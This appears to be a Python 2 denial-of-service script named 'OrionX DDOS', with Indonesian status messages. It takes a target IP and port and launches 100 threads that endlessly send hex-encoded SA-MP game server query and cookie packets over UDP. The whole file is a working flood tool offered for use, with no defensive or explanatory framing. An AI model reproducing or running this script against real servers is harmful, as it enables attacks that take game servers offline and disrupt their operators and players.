import socket
import struct
import codecs,sys
import threading
import random
import time
import os
from termcolor import colored



os.system('clear')
print("sabar....")
time.sleep(3)



ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Orion = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       ]

print colored("##########################################", ('red'))
print colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
print colored("##########################################", ('red'))

            





class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Orion[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Orion[5], (ip, int(port)))
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('#########################################################################')
         print('OrionX DDOS')
         print('#########################################################################')
         print('\n\n')
         print('Menyerang Ip {} Dihentikan'.format(orgip))
         pass
